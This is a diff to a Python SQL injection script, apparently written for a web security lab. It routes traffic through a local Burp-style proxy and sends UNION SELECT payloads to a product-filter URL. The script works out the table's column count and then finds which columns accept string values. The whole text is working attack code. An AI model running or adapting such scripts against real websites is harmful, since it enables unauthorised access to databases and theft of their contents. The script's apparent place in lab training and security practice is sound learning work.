@@ -9,30 +9,33 @@ proxies = {'http': 'http://127.0.0.1:8087', 'https': 'http://127.0.0.1:8087'}
 def exploit_sqli(url, uri, payload):
     result = 0
     columns = 'NULL'
-    payload = ''
-    for i in range(50):
+    for i in range(1, 50):
         payload = f"' UNION SELECT {columns}--"
         res = requests.get(url + uri + payload, proxies=proxies, verify=False)
-        if res.status_code == 500:
-            result = i - 1
+        if res.status_code == 200:
+            result = i
+            break
         else:
             columns += ',NULL'
     
     columns = columns.split(',')
-    dico = {x: 1 for x in range(result)}
     
     for j in range(result):
-        columns[j] = "'NULL'"
         if j > 0:
-            payload = "' UNION SELECT NULL{}--".format("".join([str(',' + x) for x in columns]))
+            columns[j] = '\'str\''
+            payload = "' UNION SELECT {}--".format(",".join(columns))
         else:
-            payload = "' UNION SELECT NULL--"
+            payload = "' UNION SELECT 'NULL'--"
+            
         res = requests.get(url + uri + payload, proxies=proxies, verify=False)
-        if res.status_code == 500:
-            dico[j] = 0
-        else:
-            columns[j] = "NULL"
-
+        
+        if "Internal Server Error" in res.text:
+            columns[j] = 'NULL'
+            if j > 1 :
+                payload = "' UNION SELECT {}--".format(",".join(columns))
+            else :
+                payload = "' UNION SELECT NULL--"
+                
     return payload
 
 if __name__ == '__main__':
@@ -45,9 +48,6 @@ if __name__ == '__main__':
         print('[-] Example: %s www.example.com "/Filter?value=Gifts" "\' or 1=1"' % sys.argv[0])
         sys.exit(-1)
 
-    columns = exploit_sqli(url, uri, payload)
+    result = exploit_sqli(url, uri, payload)
 
-    if columns:
-        print("[+] SQLi columns number is: %s." % columns)
-    else:
-        print("[-] SQL fail")
+    print("[+] SQLi attack result is: %s." % result)
